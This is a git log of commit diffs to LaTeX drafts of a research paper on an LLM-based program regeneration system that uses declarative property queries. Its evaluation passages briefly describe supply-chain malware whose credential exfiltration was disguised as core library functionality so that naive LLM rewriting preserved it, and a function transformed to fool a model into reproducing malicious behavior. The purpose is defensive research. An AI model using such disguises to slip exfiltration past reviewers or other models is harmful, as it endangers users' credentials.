+The system relies heavily on the quality and granularity of extracted or declared properties.
+In cases where desired behaviors cannot be easily expressed using available
+predicates, or where plugins fail to extract meaningful constraints, the
+regeneration plan may be under-constrained, leading to brittle or incorrect
+outputs. The framework is extensible, but each new property class requires the
+development of a new plugin that will provide a set of pre- and
+post-conditions, an extractor, and a verifier.
+
 % Overall, \sys offers a flexible framework for controlled regeneration, but
@@
 
-\section{Conclusion}
-This paper introduced \sys, a system for property-guided program regeneration
-that bridges the flexibility of large language models with the precision of
-logic-driven planning.
-By allowing developers to declaratively specify
-transformation goals as logical constraints, \sys elevates LLM-assisted program
-transformations to a controllable, interpretable, and iterative synthesis-verification
-process.
-Evaluation demonstrates that \sys produces high-quality regenerations
-across diverse tasks, outperforming naive prompting baselines in correctness,
-controllability, and resilience to adversarial or obfuscated inputs.
-
 \sys opens the door to a new class of synthesis tools that combine symbolic
@@
 correctness, explainability, and developer control as first-class citizens.
-
-% Here, I outline some possible future directions for \sys and its successors:
-
-% \heading{Expanding the transformation space}
-% Future extensions to \sys may incorporate richer classes of properties, such as
-% temporal logic and dataflow
-% constraints~\cite{azzopardi2023ltl,handa2021orderawaredataflowmodelparallel}.
-% In addition, performance-guided transformations offer a compelling avenue: \sys
-% could optimize for runtime, memory usage, or even parallelizability.
-% Inverse
-% transformations, such as serializing parallel programs, could serve as
-% a debugging or oracle mechanism in complex system settings.
-
-% \heading{Formal foundations and alternative implementations}
-% The transformation semantics introduced by \sys are grounded in logic
-% programming and inherit properties like compositionality.
-% A more formal treatment of the \sys
-% transformation language could enable rigorous reasoning about transformation
-% correctness and equivalence.
-% Furthermore, establishing an abstract interface
-% over transformations would allow alternative \sys backends to be developed.
-% Integrating techniques from
-% counterfactual reasoning~\cite{Cabalar_2020} could further enhance \sys by
-% explaining synthesis failures and clarifying conflicting property constraints.
-
-% \heading{Regeneration as a system-building primitive}
-% Beyond isolated transformations, \sys can serve as a core building block for
-% higher-level systems.
-% For instance, a reverse-engineering pipeline for
-% proprietary or legacy systems could use \sys to regenerate and recompose
-% well-behaved modules such as networking layer or the physics engine into new,
-% repurposed applications.
-% The vision here is \sys as a foundation for automated system understanding, adaptation, and re-imagination.
-
-% \heading{Challenges in cross-language regeneration}
-% Cross-language regeneration introduces challenges.
-% Some analyses and
-% properties may only be applicable in a subset of languages, or lack direct
-% equivalents across language boundaries.
-% \sys could address this in two ways: by
-% relying on least-common denominator of language semantics, or by
-% embracing language-specific features to drive more effective regeneration.
-% In
-% fact, cross-compilation could be leveraged as an asset: a plugin pipeline might
-% convert JavaScript to Haskell, extract formal properties via Haskell’s type
-% system, and then regenerate a more robust JavaScript variant informed by that
-% analysis---effectively using \sys recursively.
-
-% \heading{Ethical and legal considerations}
-% While this work has applied \sys exclusively to open-source software, its
-% capabilities raise ethical and legal questions. Regenerating
-% proprietary software, de-obfuscating binaries, or reimplementing licensed
-% systems into equivalent ones with more permissive licensing 
-% could challenge existing norms and
-% regulations. 
-% It is important to consider
-% safeguards and responsible disclosure practices towards ethical program regeneration.
 
@@
 
+\cleardoublepage
+
 \end{document}

### 2025-07-31 docs/plos/draft.tex
Many changes
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 \newcommand{\xxx}{\colorbox{red!30}{xxx}\xspace}
-\newcommand{\rtype}[1]{\setlength{\fboxsep}{1.75pt}\colorbox{lightperiwinkle}{\texttt{#1}}}
+\definecolor{lightperiwinkle}{rgb}{0.85, 0.97, 1.0}
+\newcommand{\prop}[1]{\setlength{\fboxsep}{1.75pt}\colorbox{lightperiwinkle}{\texttt{#1}}}
 \newcommand{\promptbox}[1]{%
@@
 
-\title{\sys: Controllable Program Regeneration}
+\title{\sys: Scalable, Property-Guided\\ Program Regeneration}
 \author{Evangelos Lamprou}
@@
   Software evolution tasks---like security hardening, porting critical components to safer 
-  languages, or refactoring opaque legacy code---are common-place, but as brittle and time-consuming as ever.
-  Towards their automation, large language models (LLMs) have shown promise in automating such tasks,
-  but their outputs are shaped by surface cues, lack
-  semantic guarantees, and their usage often boil down to brittle prompting strategies.
+  languages, or refactoring opaque legacy code---are commonplace, but as brittle and time-consuming as ever.
+  Towards their automation, large language models (LLMs) show promise.
+  However, their outputs are shaped by surface cues, lack semantic guarantees, and often rely on brittle prompting strategies.
   This paper presents \sys, a system for controllable program regeneration that
-  combines declarative property constraints with LLM-guided synthesis. Unlike
+  combines declarative property constraints with LLM-guided synthesis.
+  Unlike
   prior approaches, \sys treats the input program as an untrusted artifact and
-  explicitly projects it into a minimal set of verifiable properties, such as
-  the program's input/output behavior, execution traces, or interaction with external databases.
+  explicitly projects it into a set of verifiable properties, such as
+  the program's input/output behavior, execution traces, or interaction with external data stores.
   These properties are extracted and serve the dual purpose of guiding synthesis and guardrailing synthesized outputs.
@@
 \section{Introduction}
+\label{sec:intro}
 % \begin{figure}[t]
@@
 The key idea is to treat the original program as an untrusted reference from
-which to extract minimal, verifiable properties (\eg I/O behavior,
+which to extract minimal, verifiable properties (\eg input-output behavior,
 function signatures, program traces), and to synthesize a new implementation that satisfies those
@@
 which lifts the projection back to a concrete implementation~(\cref{fig:projection}).
-Unlike prompt-based approaches that require
-extensive curation of examples~\cite{dilhara2024unprecedented, khattab2023dspy, cummins2024donttransformcodecode},
-\sys treats the input program as an
-untrusted artifact and explicitly projects only minimal, verifiable properties
-into the regeneration process.
+% Unlike prompt-based approaches that require
+% extensive curation of examples~\cite{dilhara2024unprecedented, khattab2023dspy, cummins2024donttransformcodecode},
+% \sys treats the input program as an
+% untrusted artifact and explicitly projects only minimal, verifiable properties
+% into the regeneration process.
 
@@
 \heading{Rethinking program transformations}
-XXX Here, talk about bidirectional analysis, how now having a program that extracts 
-a propoerty means that plugging it into sys will allow you to regenerate programs that hold or max/min-inimize over that property
-
-\heading{Deployment scenarios and limitations}
+% Here, talk about bidirectional analysis, how now having a program that extracts 
+% a propoerty means that plugging it into sys will allow you to regenerate programs that hold or max/min-inimize over that property
+Traditional transformation frameworks typically apply a one-way mapping: 
+a program is analyzed to detect issues or features, and, separately, 
+a hand-written rule or heuristic is applied to transform it. 
+\sys enables a fundamentally different, \emph{bidirectional} view. 
+Once an analysis can \emph{extract} a property,
+that same analysis, when plugged into \sys's declarative query language and 
+verification loop, can be used to \emph{regenerate} programs that 
+satisfy, minimize, or maximize that property. 
+This shifts program analyses from passive diagnostics into \emph{active drivers} 
+of change: any property extractor becomes, effectively, a transformation oracle. 
+The result is an extensible ecosystem where existing analyses not only tell us 
+what is wrong or suboptimal, but also allow us to automatically create 
+semantics-preserving, property-optimized alternatives.
+
+\heading{Deployment scenarios}
 \sys supports a range of deployment scenarios.
@@
 % For example, a developer can regenerate a C library as idiomatic
-% JavaScript while preserving I/O equivalence, or decompose a monolithic function
+% JavaScript while preserving input-output equivalence, or decompose a monolithic function
 % into modular components suitable for sandboxing.
@@
 
+\heading{Availability}
+The \sys early-stage prototype in available as an open-source MIT-licensed artifact at:
+\begin{center}
+  \url{https://github.com/blinded}
+\end{center}
+
 \section{Point Solutions}
@@
 For example, a developer going through older parts of the codebase written by 
-a previous team might realize that many functions are susceptible to buffer-overflow 
-either through malice or by accident.
-Then, thinking about a recently incorporated scripting component 
-that allows players to make custom extensions to key parts of client-side game logic using JavaScript 
-gives the idea tha maybe code that deals with user input should all be moved inside 
-the sandboxed script engine.
+a previous team might realize that many functions are susceptible to buffer-overflow attacks.
+Then, thinking about a recently incorporated JavaScript scripting component 
+that allows players to make custom extensions to key parts of client-side game logic, 
+suggests that perhaps code that deals with user input should all be moved inside 
+the sandboxed runtime.
 Furthermore, the development team would like to identify functions that could 
@@
 to attack the above problems, but all come with shortcomings.
-Code quality tools~\cite{codeql, MORE} and specialized transformation systems might be able to detect 
+Code quality tools~\cite{avgustinov2016ql, Fowler99,Mens04,Myers16} and specialized transformation systems might be able to detect 
 code-smells or certain classes of vulnerabilities but are often very highly 
-tied to their target lagnuage.
+tied to their target language.
 As the programming-language landscape is becoming increasingly diverse,
@@
 the developer to 
-The ever-present limitation of traditional program synthesis techniques is their 
+The ever-present limitation of traditional program synthesis techniques~\cite{jha2010oracle, raza2018disjunctive, singh2016blinkfill,wu2023programming, harp:ccs:2021, yaghmazadeh2018automated} is their
 inability to scale beyond narrowly-defined computational domains.
@@
 have promised to solve.
-An LLM could in principle be tasked with performing all the afformentioned trasnformations.
-However, their problems X, Y, Z. 
+An LLM could in principle be tasked with performing all the aforementioned transformations.
+However, they come with no shortage of well-studied shortcomings~(\cref{sec:intro}).
 There have been systems that provide ranging amounts of control of LLM-generated 
-programs, but there is a large gap of a unifying framework that identifies 
-key parts of the problems and applies LLMs in a way that underlines their strenghths 
-and allows the programmer to steer their output and be aware of incorrect generations.
+programs~\cite{huang2023anplnaturalprogramminginteractive,li2025mccoderstreamliningmotioncontrol,barua2025pygencollaborativehumanaiapproach, tihanyi2025new},
+but there is a large gap of a unifying framework that identifies 
+key parts of the problems and applies LLMs in a way that underlines their strengths,
+end-users to steer their output, and---more importantly---be aware when 
+their outputs are \emph{wrong}.
 
@@
 
-\section{Example}
+\section{Examples}
 \label{sec:example}
@@
 
-This examples illustrates the capabilities of \sys by applying it to a representative game
-application.
-This example is selected to highlight the
+This example is used to highlight the
 diversity of transformation goals that arise even within a single codebase:
@@
 To the right is a program written in the \sys DSL to express this intent.
-This query requires the regenerated program \texttt{P\_} to exhibit the same
-I/O behavior on representative inputs that would cause a buffer overflow in the original program $P$.
-but not on the regenerated program $P^\prime$.
+This query requires the regenerated program \ttt{P\_} to exhibit the same
+input-output behavior on representative inputs that would cause a buffer overflow in the original program \ttt{P}.
+but not on the regenerated program \ttt{P\_}.
 \sys first arrives the set of properties to extract from the
 original program, given the query:
-$\{\ttt{input(P, I)}, \ttt{graph(P, I, O)}, \ttt{signature(P, S)}\}$, where
-\texttt{input(P, I)} means that \sys will use extract a set of inputs from the original program
+\{\prop{input(P, I)}, \prop{graph(P, I, O)}, \prop{fsignt(P, S)}\}, where
+\prop{input(P, I)} means that \sys will use extract a set of inputs from the original program
 by prompting an LLM with the program's source code and asking it to generate a set of inputs that
 would cause a buffer overflow in the original program;
-\texttt{graph(P, I, O)} extracts the client-observable I/O behavior of the program
+\prop{graph(P, I, O)} extracts the client-observable input-output behavior of the program
 by executing the original program on the generated inputs and recording the outputs;
-and \texttt{signature(P, S)} extracts each function's signature using a language-aware parser.
-
+and \prop{fsignt(P, S)} extracts each function's signature using a language-aware parser.
 After 30.4 seconds and two attempts, \sys synthesizes the following program:
@@
 
-\begin{wrapfigure}[5]{r}{.46\columnwidth}
+\begin{wrapfigure}[5]{r}{.43\columnwidth}
 \begin{minted}{prolog}
-language(p_, javascript).
+language(p_, js).
 graph(p_, Ijs, Ojs) :-
@@
 To bridge differences in
-representation between C and JavaScript, the query uses \texttt{llm\_translate}
+representation between C and JavaScript, the query invokes the \ttt{tr} plugin
 to convert each input and output into equivalent forms suitable for the target language.
 \sys first determines the minimal set of properties to extract from the
-original function: $\{\texttt{graph(P, I, O)}\}$.
-It then invokes \texttt{llm\_translate} to produce
+original function: \{\prop{graph(P, I, O)}\}.
+It then, again, invokes \ttt{tr} to produce
 corresponding JavaScript representations of each example input and output, such
@@
 which makes the \ttt{argc} argument obsolete.
-The synthesis backend had the freedom to make this change since the query did not specify a signature property.
+The synthesis backend had the freedom to make this change since the query did not require preserving
+the function signature.
 
@@
 preserving observable behavior over a representative set of inputs which will be generated by an LLM instance.
-\begin{wrapfigure}[2]{r}{.56\columnwidth}
+\begin{wrapfigure}[2]{r}{.6\columnwidth}
 \begin{minted}{prolog}
@@
 \end{wrapfigure}
-\sys extracts the set of properties \texttt{graph(p)}
+\sys extracts the set of properties \{\prop{graph(P, I, O)}, \prop{len(P, N)}\}
 from the original program
@@
 inputs.
-In this case, where the goal is to optimize an aspect of the program, \sys
+In this case, where the goal is to optimize an aspect of the program---its length---\sys
 re-prompts the model to regenerate the program until it can make no further
-improvements or observes a negligible difference after two consecutive
-iterations.
-
-After 15.2 seconds and two iterations, \sys synthesizes the following idiomatic and portable version:
+improvements or observes no difference after two consecutive regenerations.
+
+After 15.2 seconds and three iterations, \sys synthesizes the following idiomatic and portable version:
 \begin{minted}{c}
@@
 functions whose composition is equivalent to the original implementation and
-that preserve both I/O behavior and SQL trace properties (where a trace records
+that preserve both input-output behavior and SQL trace properties (where a trace records
 the sequence of queries executed against the database).
@@
 
-The resulting program which now conists of two functions is:
+The resulting program which now consists of two functions is:
 \begin{minted}{javascript}
@@
 
-\heading{Key results}
+\heading{Key result}
 \sys is able to effectively transform all programs across the above tasks,
@@
 A total
-of six property extraction/verification plugins (\ttt{graph}, \ttt{fsignt}, \ttt{sql\_trc}, and \ttt{llm\_translate})
+of seven property extraction/verification plugins (\ttt{graph}, \ttt{fsignt}, \ttt{crash}, \ttt{sql\_trc}, and \ttt{tr})
 were required to perform the above transformations, each
@@
 \end{wrapfigure}
-For \sys to enable developers
-to express transformation goals declaratively---as constraints over the desired
-properties of regenerated code---and automatically synthesizes implementations
-that satisfy those constraints.
+The insights that fuel \sys's design~(\cref{sec:intro}) lead to the following key ingredients.
 
@@
 (1) \ttt{apply} which obtains static or dynamic properties from the original program (\eg
-I/O traces, type signatures, or side-effect summaries),
+input-output traces, type signatures, or side-effect summaries),
 (2) \ttt{verify} that will check the regenerated program against these properties (re-extracting them and comparing them to the original ones),
@@
 (3) \ttt{know} adds pre/post-conditions that inform regeneration planning.
-The vision of \sys it to encourages community-driven growth, where specialized plugins---\eg for
+The vision of \sys it to encourage community-driven growth, where specialized plugins---\eg for
 security invariants or performance contracts---can coexist and interoperate
@@
 \heading{A declarative query language}
-To detach itself from the details of the underlying analysis and
+The dizzying rate of progress in the space of 
+code-generating LLMs calls for an interface 
+that abstracts over the specific strengths and weaknesses of specific models 
+and allows the underlying implementation to advance separately from the rest of the system.
+An obvious choice: a high-level, declarative language that 
+allows for reasoning irrespective of the underlying synthesis backend.
+
+The \sys query language allows one to describe transformation intent as logical constraints over program 
+properties. 
+These queries are resolved against a \emph{knowledge base} of extracted 
+program properties and plugin-provided pre- and post-conditions that specify when an analysis is applicable, or not.
+This represents the space of behaviors and invariants 
+that must be preserved, eliminated or optimized.
 
@@
 \heading{Regeneration guardrails}
-The final ingredient is a synthesis–verification loop that turns declarative goals into trustworthy code.
-Given extracted properties and a query, Kvasir synthesizes candidate implementations using LLMs, leveraging their flexibility and knowledge of diverse programming idioms.
+Synthesis leverages an LLM as an 
+(imperfect but flexible) \emph{bidirectional analysis}, capable of 
+mapping between representations.
+
+To make this work, the final ingredient is a synthesis and verification loop that turns declarative goals into trustworthy code.
+Given extracted properties and a query, \sys synthesizes candidate implementations using LLMs, leveraging their flexibility and knowledge of diverse programming idioms.
 Each candidate is then checked against the declared properties: does it preserve the specified behavior, meet language or security constraints, and satisfy any additional invariants?
-Failures trigger retries, refined prompts, or additional property extraction,
-while successes provide an auditable proof of meeting the user’s intent,
-at least as far as the properties allow (which is still a lot more than most LLM-based systems can guarantee).
+Failures trigger retries, a refined prompt.
+A success provides an auditable proof of meeting the user's intent,
+at least as far as the extracted properties allow (which is still a lot more than most LLM-based systems can guarantee).
 
 \heading{Prototype implementation}
-The \sys prototype implemetation uses Python vXXX,
-the Pluggy library to define pluggable hooks, compiles queries to Clingo and uses the clasp
+The \sys prototype implemetation uses Python v3.13,
+the \ttt{pluggy} system~\cite{pluggy} to define plugin hooks,
+compiles queries to the Clingo language~\cite{DBLP:journals/corr/GebserKKS14} and uses the \ttt{clasp}~\cite{gebser2007clasp}
 solver to arrive at a stable model which is converted to synthesis plans. 
-XXX plugins have been implemented. All plugins range from XXX to XXX lines-of-code,
-with the entire codebase being XXX lines-of-code.
+A total of seven plugins have been implemented (\ttt{graph}, \ttt{tr}, \ttt{len}, \ttt{sql\_trc}, \ttt{call}, \ttt{crash}, \ttt{fsignt}).
+Each plugin ranges from 9 to 51 lines-of-code,
+with the entire codebase being 605 lines-of-code.
 
@@
 Today, there is no equivalent of SPEC for performance or Defects4J for bug
-fixing—researchers rely on ad hoc examples that are hard to compare and often
-oversimplified. This lack of a shared baseline obscures progress: when one
-approach claims success on “language migration” and another on “security
-hardening,” we have no way to tell whether they solve the same problem, let
-alone which approach generalizes better.
-
-Kvasir takes a step in this direction with its prototype benchmarks.
+fixing---researchers and practioners rely on ad hoc examples that are hard to compare and often
+oversimplified.
+This lack of a shared baseline obscures progress. 
+A useful set of benchmarks should include
+programs that
+(1) are real and non-trivial,
+(2) are written in a variety of languages, 
+(3) cover a wide range of computational domains.
+Each benchmark should include an original program, 
+the same program that undergoes the transformation described in natural-language 
+in an accompanying file, and a set of tests that verify that the transformation was succesful.
+Following the lead of benchmarking efforts~\cite{SPEC_CPU2017, dacapo2006, koala:atc:2025}, the suite should be made open-source, community 
+first, and an established technical steering commitee should guide extensions and modifications towards maintaining the suite's relevance.
+
+\sys takes a step in this direction with its prototype benchmarks.
 This suite contains tasks across several dimensions: its
@@
 
-% TODO: Describe what a good benchmark suite would look like
-The benchmark suite comprises 37 tasks spanning simple translation, obfuscation
-removal, and security hardening (\cref{tab:benchmarks}). Inputs were drawn
-from Rosetta Code, popular npm and PyPi packages, known supply-chain attacks,
+The benchmark suite comprises 37 tasks spanning language translation, obfuscation
+removal, and security hardening~(\cref{tab:benchmarks}).
+Inputs were drawn from established sources
+like the Rosetta Code project, popular npm and PyPi packages, high-profile supply-chain attacks,
 and selected obfuscated programs from the IOCCC.
@@
 the Purpose column describes the regeneration task.}
-\begin{tabular}{lrrll}
+\begin{tabular}{lrll}
 \toprule
@@
 Utilities   & 13 & Parity preservation        & \cite{regbench2025} \\
-SSCA        & 3  & Malicious behavior removal & \cite{ohm2020backstabber,ev:eurosec:2022} \\
+SSCA        & 3  & Side-effect removal & \cite{ohm2020backstabber,ev:eurosec:2022} \\
 IOCCC       & 2  & Deobfuscation              & \cite{ioccc} \\
+Microb/marks & 3 & See \cref{sec:example} & \cref{sec:example} \\
+\midrule
+  Total     & 37 &                           & \\
 % Microbenchmarks & 3  & LoC & Idiomatic rewriting, modularization & This paper \\
@@
 
-In microbenchmarks, \sys generated idiomatic rewrites (e.g., replacing unsafe
+In microbenchmarks, \sys generated idiomatic rewrites (\eg replacing unsafe
 inverse square root implementations with standard library calls) while
@@
 For example, in the malicious supply-chain benchmarks, naive prompting
-preserved obfuscated credential exfiltration in regenerated code, whereas \sys
-consistently eliminated it.
+preserved credential exfiltration in regenerated code, as the code 
+was constructed in a way to appear as part of the original library's core functionality.
+For deobfuscation tasks, obfuscation techniques that were meant to disorient 
+humans (\eg renaming a function that performs addition \ttt{minus})
+were equally unintepretable by the LLM, leading to obviously incorrect regenerations.
+Furthermore, in the idiomatization task the LLM overfits 
+to the original source code and maintains unidiomatic details (\eg bit-level manipulation)
+in the regenerated program.
+Highlights from this preliminary evaluation can be found in \cref{appendix:samples}.
 
@@
 \label{sec:limitations}
+
+The so-far 
+described subsystems~(\cref{sec:design}) can be combined to solve all transformation
+goals in the snippets shown so far~(\cref{sec:example}).
+Scaling these techniques further, however, poses more challegnes and uncovers implications.
 
@@
 This means that correctness is only as strong as the property definitions and associated verifiers.
-In the presence of underspecified or unverifiable goals,
+In the presence of underspecified or unverifiable goals
 regenerated code
@@
 under minor input changes.
-\sys does not mitigate these risks,
-but allows their detection
-through post-hoc verification.
-In cases where the system finds no satisfactory candidate,
-regeneration fails.
+Right now, in cases where the system finds no satisfactory candidate, regeneration fails,
+but mitigating these risks, even partially will 
+require co-design between the property extraction and synthesis backend~\cite{banerjee2025crane}.
 
@@
 
-\sys supports property-guided regeneration of program fragments, with a
-particular focus on function-level rewrites. Its strength lies in combining
-symbolic reasoning and generative synthesis in a modular and interpretable
-framework. However, this design comes with inherent trade-offs.
-
-\heading{Dependence on property specification}
-The system relies heavily on the quality and granularity of extracted or declared properties.
-In cases where desired behaviors cannot be easily expressed using available
-predicates, or where plugins fail to extract meaningful constraints, the
-regeneration plan may be under-constrained, leading to brittle or incorrect
-outputs. The framework is extensible, but each new property class requires the
-development of a new plugin that will provide a set of pre- and
-post-conditions, an extractor, and a verifier.
+% \sys supports property-guided regeneration of program fragments, with a
+% particular focus on function-level rewrites. Its strength lies in combining
+% symbolic reasoning and generative synthesis in a modular and interpretable
+% framework. However, this design comes with inherent trade-offs.
+
+A system in which verifying that a program satisfies a property is equivalent
+to synthesizing a program that enforces it unlocks a wide range of future
+opportunities for impactful program transformations, spanning domains like security,
+performance, and correctness.
+
+\heading{Security}
+Property-guided regeneration can enforce strong security 
+policies, such as eliminating vulnerable API calls, sandboxing 
+untrusted components, or removing implicit data leaks. 
+Because \sys treats the input program as untrusted, 
+analyses that detect undesirable information flows or unsafe 
+behaviors can be inverted into transformations that 
+\emph{actively eliminate} those risks.
+
+\heading{Performance}
+Performance-guided transformations offer a compelling avenue: \sys
+could optimize for runtime, memory usage, or even parallelizability, \eg
+program $P\_$ should exhibit the same input-output behavior, but run twice as fast.
+Inverse
+transformations, such as serializing parallel programs, could serve as
+a debugging or oracle mechanism in complex system settings.
+
+\heading{Correctness}
+Future extensions to \sys may incorporate richer classes of properties, such as
+temporal logic and dataflow
+constraints~\cite{azzopardi2023ltl,handa2021orderawaredataflowmodelparallel}.
+Refactoring towards a different API or paradigm could be done by applying 
+\sys incrementally to the entire codebase, with the goal of all regenerated 
+components being written in the query-prescribed way, while still being compatible 
+with the rest of the project.
+
+\heading{A system-building primitive}
+Beyond isolated transformations, \sys can serve as a core building block for
+higher-level systems.
+For instance, a reverse-engineering pipeline for
+proprietary or legacy systems could use \sys to regenerate and recompose
+well-behaved modules such as a networking layer or the physics engine into open-source,
+repurposed applications.
+\sys can become a foundation for automated system understanding, adaptation, and re-imagination.
+
+% \heading{Dependence on property specification}
+% Many of the provided guarantees rely heavily on the quality and granularity of extracted or declared properties.
+% In cases where desired behaviors cannot be easily expressed using available
+% predicates, or where plugins fail to extract meaningful constraints, the
+% regeneration plan may be under-constrained, leading to incorrect
+% outputs or incompatibilities between the regenerated program and the larger codebase.
+% Taking a page from information theory, 
+% and, again, leveraging the internal representations of program code and properties,
+% it could be possible
 
@@
 reasoning and neural generation under a unified, extensible framework.
-As program synthesis systems grow increasingly reliant on LLMs, I believe the
+As program synthesis systems grow increasingly reliant on LLMs, it is very much possible that the
 future lies in harnessing their generative power within a framework that retains
 correctness, explainability, and developer control as first-class citizens.
+This description of the \sys prototype and preliminary results serves 
+as a call to action.
 
@@
 \section{Evaluation Samples}
+\label{appendix:samples}
 This section provides a selection of samples from the evaluation of \sys.
 These instances provide some interesting insights into the capabilities of \sys, the challenges it faces.
-Some examples also feature constrasts between \sys and a naive LLM-based approach.
+Some examples also feature contrasts between \sys and a naive LLM-based approach.
 
@@
 reaches a specified length.
-\begin{wrapfigure}[4]{r}{0.4\columnwidth}
+
+\begin{wrapfigure}[2]{r}{0.4\columnwidth}
 \begin{minted}{prolog}
@@
 \end{wrapfigure}
-The query for \sys is shown on the right and asserts the the input/output behavior of the
+The query for \sys is shown on the right and asserts the input/output behavior of the
 original program is preserved in the output.
@@
 use cases and the logarithmic complexity of the padding operation.
-This example inspires future work on performance-aware regeneration.
+This highlights opportunities for future work in performance-aware transformations.
 
@@
 more idiomatic code.
-\begin{wrapfigure}[4]{r}{0.65\columnwidth}
+
+\begin{wrapfigure}[2]{r}{0.65\columnwidth}
 \begin{minted}{prolog}
@@
 program to remove that potential security vulnerabilities or malicious behavior.
-\begin{wrapfigure}[3]{r}{0.7\columnwidth}
+
+\begin{wrapfigure}[2]{r}{0.7\columnwidth}
 \begin{minted}{prolog}
@@
   \caption{The same string-compare function transformed to fool
-  an LLM like \gptmodel into making it reproduce the malicious behavior.}
+  an LLM like \gptmodel into reproducing the malicious behavior.}
 \end{listing}

### 2025-07-31 docs/paper/draft.tex
Add plugins paragraph
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 
+\heading{Plugins}
+In order to maximize the applicability of the \sys framework 
+towards many different kinds of transformations,
+it is designed as an extensible platform rather than a monolithic tool.
+All core functionality is provided by plugins, each contributing
+the following functionality in the form three runtime hooks:
+(1) \ttt{apply} which obtains static or dynamic properties from the original program (\eg
+input-output traces, type signatures, or side-effect summaries),
+(2) \ttt{verify} that will check the regenerated program against these properties (re-extracting them and comparing them to the original ones),
+and
+(3) \ttt{know} facts to the knowledge-base that inform regeneration planning.
+
 \heading{Compilation to ASP}

### 2025-07-31 docs/plos/draft.tex
Fix typos
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 % and patch security vulnerabilities~\cite{ikegami2022userefactoringsecurityvulnerability,schneier2013security_vulnerabilities}.
-These transformations, are often brittle, time-consuming, and require significant expertise.
+These transformations are often brittle, time-consuming, and require significant expertise.
 
@@
 leading to workflows that are difficult to audit, integrate, or systematically reason about.
-Bridging this gap calls for an that allows developers to specify explicit semantic constraints and transformation goals, and to reason about their satisfaction in a principled way.
+Bridging this gap calls for an approach that allows developers to specify explicit semantic constraints and transformation goals, and to reason about their satisfaction in a principled way.
 
@@
 Furthermore, the development team would like to identify functions that could 
-be broken-down further to assist with performance profiling.
+be broken down further to assist with performance profiling.
 
@@
 As the programming-language landscape is becoming increasingly diverse,
-and developers are building systems where multiple different languages are runtimes co-exist,
+and developers are building systems where multiple different languages are runtimes coexist,
 these limitations cannot be ignored.
@@
   and shaded vertices signify parts of the codebase \sys is applied to~(\cref{sec:example}).
-  Dotted edges signify ommited layers of dependencies.
+  Dotted edges signify omitted layers of dependencies.
   }
@@
 This query requires the regenerated program \ttt{P\_} to exhibit the same
-input-output behavior on representative inputs that would cause a buffer overflow in the original program \ttt{P}.
+input-output behavior on representative inputs that would cause a buffer overflow in the original program \ttt{P}
 but not on the regenerated program \ttt{P\_}.
@@
 and \prop{fsignt(P, S)} extracts each function's signature using a language-aware parser.
-After 30.4 seconds and two attempts, \sys synthesizes the following program:
+After 30.4 seconds and two attempts \sys synthesizes the following program:
 \begin{minted}[]{js}
@@
 \heading{Prototype implementation}
-The \sys prototype implemetation uses Python v3.13,
+The \sys prototype implementation uses Python v3.13,
 the \ttt{pluggy} system~\cite{pluggy} to define plugin hooks,
@@
 Today, there is no equivalent of SPEC for performance or Defects4J for bug
-fixing---researchers and practioners rely on ad hoc examples that are hard to compare and often
+fixing---researchers and practitioners rely on ad hoc examples that are hard to compare and often
 oversimplified.
@@
 the same program that undergoes the transformation described in natural-language 
-in an accompanying file, and a set of tests that verify that the transformation was succesful.
+in an accompanying file, and a set of tests that verify that the transformation was successful.
 Following the lead of benchmarking efforts~\cite{SPEC_CPU2017, dacapo2006, koala:atc:2025}, the suite should be made open-source, community 
-first, and an established technical steering commitee should guide extensions and modifications towards maintaining the suite's relevance.
+first, and an established technical steering committee should guide extensions and modifications towards maintaining the suite's relevance.
 
@@
 goals in the snippets shown so far~(\cref{sec:example}).
-Scaling these techniques further, however, poses more challegnes and uncovers implications.
+Scaling these techniques further, however, poses more challenges and uncovers implications.
 

### 2025-07-31 docs/paper/draft.tex
Fix typos
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 
-\heading{A compromised javascript library}
+\heading{A compromised JavaScript library}
 The \ttt{flatmap-stream} library was implicated in a high-profile
@@
 global state under specific conditions.
-Speficially, 
+Specifically, 
 the library would
@@
 The slightly simplified source code of the compromised library showing the malicious payload and a final
-line that performs the benign flatmap functionality is shown below:
+line that performs the benign \ttt{flatmap} functionality is shown below:
 \begin{minted}[frame=lines]{js}
@@
 original program, given its knowledge base and the query.
-This set is $\{$\ttt{graph(p, I, O)}, \ttt{inpt(P, I)}, \ttt{fsignt(P, S)}, \ttt{pure(P)}$\}$, where
+This set is $\{$\ttt{graph(p, I, O)}, \ttt{fsignt(P, S)}, \ttt{pure(P)}$\}$, where
 \ttt{input(p, I)} means that \sys will use the \ttt{input} plugin extract a set of inputs from the original program
@@
 and finally, it regenerates this projection back into a concrete program.
-The idea of casting programs into a high-dimensioanl space has been studied before~\cite{ben-nun2018neural,alon2019code2vec,ellis2020dreamcoder,nye2021platypus},
+The idea of casting programs into a high-dimensional space has been studied before~\cite{ben-nun2018neural,alon2019code2vec,ellis2020dreamcoder,nye2021platypus},
 but \sys's perspective might offer interesting insights.
@@
 \Cref{lst:fast_inv_sqrt_gpt} shows the output of naively regenerating the function using \gptmodel,
-which retains the original's un-idiomatic use of magic numbers and bit-level manipulation.
+which retains the original's unidiomatic use of magic numbers and bit-level manipulation.
 \Cref{lst:fast_inv_sqrt_sys} has the output of \sys, which instead uses the standard library's

### 2025-07-31 docs/paper/draft.tex
Small fixes
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 and others are specific to the input program's language and runtime model.
-Plugins insert preconditions for the analyses they provide into the \sys knowledge base.
+Plugins insert preconditions for the analyses they provide into the \sys knowledge base
+and are responsible 
+for any kind and tracing and analysis towards property extraction.
 
@@
 	i  = * ( long * ) &y;                       // evil floating point bit level hacking
-	i  = 0x5f3759df - ( i >> 1 );               // what the fuck?
+	i  = 0x5f3759df - ( i >> 1 );               // what the ****?
 	y  = * ( float * ) &i;

### 2025-08-01 docs/plos/draft.tex
Updates
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 
-\title{\sys: Scalable, Property-Guided\\ Program Regeneration}
-\author{Evangelos Lamprou}
+\title{Scalable Property-Guided Program Regeneration}
+\author{}
 
@@
 Second, the program \emph{regeneration} setting provides a unique advantage: the original program serves as a concrete ground-truth, enabling semantic comparisons and verification of the transformed output, something impossible in traditional synthesis tasks.
-Third, the underlying synthesis technology---particularly LLMs---is evolving rapidly; a declarative interface harnesses this progress without disrupting the framework's end user.
